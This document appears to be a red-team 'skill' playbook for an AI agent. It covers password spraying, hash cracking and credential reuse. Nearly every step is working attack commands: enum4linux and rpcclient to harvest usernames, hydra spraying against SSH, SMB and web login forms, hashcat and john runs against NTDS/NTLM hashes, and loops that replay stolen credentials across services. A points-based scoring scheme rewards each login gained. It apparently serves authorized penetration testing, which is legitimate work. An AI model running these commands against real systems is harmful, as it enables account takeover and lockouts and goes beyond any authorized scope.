# Credential Attack: Spraying, Cracking, and Credential Reuse

Turns a username list and a pile of captured hashes into working logins. Everything this skill produces lands in two places: raw tool artifacts under `RESULT_DIR` (spray logs, cracked hashes, harvested account lists) and `credential` rows in the engagement database recorded through `redteam_credential_add`. A credential only counts when a real login was performed, so every row points at the transcript that proves it.

`RESULT_DIR` is the engagement result directory (`runs/` under the engagement root unless the operator points it elsewhere).

## When to use

- You have a list of accounts from enumeration (SMB, LDAP, OWA, a leaked staff directory, a web login error that reveals usernames) and need one working password.
- You captured hashes from a dump (`secretsdump`, `SAM`/`NTDS`, a database `users` table, a config file with `password=` lines) and need plaintext for systems that reject pass-the-hash.
- Service-level authentication is exposed on the internet or on an internal segment reached through a tunnel: SSH `22`, FTP `21`, RDP `3389`, SMB `445`, MySQL `3306`, MSSQL `1433`, or a form login on `80`/`443`/`PORT`.
- A previous account worked somewhere and you want to test reuse across the same domain before doing anything louder.
- Not for: creating accounts, registering users, or resetting/forcing password changes — self-created accounts are not a result.
- Not for: firing 500 parallel threads at a production login to "see what happens". That locks accounts and deletes your access.

## Prerequisites

Every step below has a fallback and nothing in this list is mandatory — if a tool is missing, use the fallback named beside it.

- `hydra` — `apt install hydra`. Fallback: a `python3` request loop against one form, or the database/service client in a shell loop with `sleep 2`.
- `hashcat` — `apt install hashcat`. Fallback: `john` (slower, CPU friendly), or hand the hashes to the service that produced them (Kerberoast tickets can be cracked offline on any box).
- `john` — `apt install john`. Fallback: `hashcat -m ...`, or a targeted dictionary check with `grep -Ff`.
- Wordlists — `sudo apt install wordlists && gunzip /usr/share/wordlists/rockyou.txt.gz`. Fallback: build a small list from the target's own vocabulary (see step 4), which usually beats the generic list anyway.

## Workflow

1. Confirm what you already hold before you attack anything. Read the database, not your memory.

```
# existing access and credentials for this engagement
redteam_credential_list
redteam_access_list
```

2. Harvest usernames. Prefer accounts that appear in multiple services, and keep the raw output.

```
enum4linux -U -P TARGET            # users + password/lockout policy
rpcclient -U '' -N TARGET -c 'enumdomusers'
curl -s http://TARGET/ | grep -oE '[a-z]+\.[a-z]+@DOMAIN' | sort -u > RESULT_DIR/users-raw.txt
awk -F'[\\\\@]' '{print $2}' RESULT_DIR/users-raw.txt | sort -u > RESULT_DIR/users.txt
```

3. Read the lockout policy before the first guess. This single step decides whether you spray or crack.

```
enum4linux -P TARGET | tee RESULT_DIR/lockout-policy.txt
rpcclient -U '' -N TARGET -c 'getdompwinfo'
```

- Threshold 0 or `None` → spraying is safe with a low thread count.
- Threshold 3-5 with a 30 minute window → one attempt per account per window, and only against lists you trust.

4. Build a targeted dictionary. Organization name, year, season, product line, and the local keyboard pattern beat any generic list.

```
printf '%s\n' \
  'Company@2025' 'Company@2026' 'company123' 'Company!@#' \
  'Welcome1' 'P@ssw0rd' 'admin@123' 'Password1!' > RESULT_DIR/wordlist-targeted.txt

# expand the generic list with cheap mutations instead of downloading a bigger one
hashcat --stdout WORDLIST -r /usr/share/hashcat/rules/best64.rule > RESULT_DIR/wordlist-mutated.txt
```

5. Spray one password across many accounts before you spray many passwords at one account.

```
# SSH, low and slow: -t 2 keeps you under most rate limits, -W 3 waits per connection
hydra -L RESULT_DIR/users.txt -p 'Company@2026' -t 2 -W 3 -f -I -V \
  ssh://TARGET -s PORT -o RESULT_DIR/spray-ssh-TARGET.txt

# SMB / domain accounts
hydra -L RESULT_DIR/users.txt -p 'Company@2026' -t 2 -W 3 -f -I \
  smb://TARGET_IP -o RESULT_DIR/spray-smb-TARGET_IP.txt

```

6. Form logins need the failure string, not the success string. Grab it once with `curl`, then pin it with `F=`.

```
curl -s -i -X POST http://TARGET/login -d 'user=probe&pass=probe' | head -20

hydra -L RESULT_DIR/users.txt -P RESULT_DIR/wordlist-targeted.txt -t 2 -f -I \
  TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials' \
  -o RESULT_DIR/spray-web-TARGET.txt
```

7. Crack offline whatever the online attack cannot reach. Identify the mode first instead of guessing it.

```
hashcat --identify RESULT_DIR/hashes.txt
# 0 md5 | 1000 NTLM | 5600 NetNTLMv2 | 13100 Kerberoast | 18200 AS-REP | 3200 bcrypt | 500 md5crypt

hashcat -m 1000 -a 0 RESULT_DIR/ntds-hashes.txt RESULT_DIR/wordlist-mutated.txt \
  -r /usr/share/hashcat/rules/best64.rule -O -w 3 \
  -o RESULT_DIR/cracked-ntlm.txt --potfile-path RESULT_DIR/hashcat.potfile

john --wordlist=RESULT_DIR/wordlist-mutated.txt --rules --format=NT RESULT_DIR/ntds-hashes.txt
```

8. Prove the hit with a real session before you record it. A "valid password found" line is not access.

```
curl -s -i -c RESULT_DIR/cookie-TARGET.txt -X POST http://TARGET/login \
  -d 'user=USERNAME&pass=PASSWORD1' | head -20
curl -s -b RESULT_DIR/cookie-TARGET.txt http://TARGET/account | tee RESULT_DIR/login-proof-TARGET.txt

mysql -h TARGET -P 3306 -u USERNAME -p'PASSWORD1' \
  -e 'select user(), current_user(), version();' | tee RESULT_DIR/login-proof-mysql.txt

```

9. Reuse before you re-crack. One working domain password usually opens three more services, and reuse produces no lockouts.

```
for svc in ssh ftp rdp smb; do
  hydra -l USERNAME -p 'PASSWORD1' -t 1 -f "$svc://TARGET_IP" \
    -o "RESULT_DIR/reuse-$svc.txt" 2>/dev/null
done
```

10. Record every validated credential, then let reuse feed the next skill (lateral movement, redis, unauth services).

```
redteam_credential_add host=TARGET_IP username=USERNAME secret_type=password \
  secret_value='PASSWORD1' secret_ref=RESULT_DIR/login-proof-TARGET.txt \
  privilege=user source='spray' tool='hydra'

redteam_score_hit code=web-app points=50 target=http://TARGET:PORT/ \
  evidence='login as USERNAME returned 200 and the account page, cookie in RESULT_DIR/login-proof-TARGET.txt'

```

## Output and evidence

Files under `RESULT_DIR`:

- `spray-<proto>-<host>.txt` — `hydra -o` log, one line per valid login.
- `hashcat.potfile`, `cracked-<mode>.txt`, `john-cracked.txt` — hash → plaintext material.
- `users.txt`, `wordlist-targeted.txt`, `lockout-policy.txt` — the input side of the run, needed to reproduce it.
- `login-proof-<service>.txt` — the actual authenticated response. This is the evidence file.

Database rows:

- `credential` via `redteam_credential_add`: `host`, `username`, `secret_type`, `secret_value`, `secret_ref`, `privilege`, `source`, `tool`.
- Score hit via `redteam_score_hit` only when a login or query succeeded: `db-credential` (`points=10` for a normal or unauthorized account, `points=50` for an admin account), `web-app` (`points=50` user, `points=100` admin), `netdev` (`points=100` user, `points=200` admin).
- Chain step via `redteam_chain_add` with `stage=access`.

What counts as evidence: the response of an authenticated request (`200` plus application content, a query result row, a service banner after `230`/`OK`). A cracked plaintext alone is a credential, not a scored result — the login must be replayed first.

## Failure modes

- `hydra` prints `[22][ssh] host: ... login: admin password: ...` but every session is refused → the account is locked or the service answers 200 to anything. Re-check with a single manual request; if it fails, you are being tarpitted.
- Hydra slows to a crawl and starts reporting `Connection reset by peer` → thread count is above what the target tolerates. Drop to `-t 2`, add `-W 3`.
- `hashcat` reports `Token length exception` or `No hashes loaded` → wrong mode or a file containing mixed formats. Run `hashcat --identify`, split the file by format, crack each separately.
- `hashcat` burns hours at 30 kH/s → CPU only (`-D 1` in effect) or the mask is too wide. Switch to `best64.rule` over the targeted list.
- A spray locks the only account you had → nothing to fix, something to avoid: probe the policy (step 3) and cap attempts per account per window.

## Notes

- Throttle with `THREADS` and `RATE` rather than hard-coded numbers; `-t 2` for SSH/SMB/OWA, `-t 4` at most for a database port, one attempt per account per lockout window.
- Online spraying is the loudest thing this skill does and it is the only part that can destroy access. Offline cracking makes no traffic at all — when in doubt, crack instead of spray.
- Idempotency: `hydra -I` restarts clean; `hashcat --restore` and `--session NAME` resume a run; `john` is resumable by default and stores state in `~/.john/john.rec`.
- Resume after a disconnect by reading `RESULT_DIR/spray-*.txt` first — do not restart a spray that already succeeded, since the second pass hits the lockout counter.
- Never write plaintext passwords into reports or transcripts; `secret_value` goes into the database and `secret_ref` points at the proof file.
- Keep the credential database ahead of the shell work: `lateral-movement` and `unauth-exploit` both read `redteam_credential_list` to pick the next target.
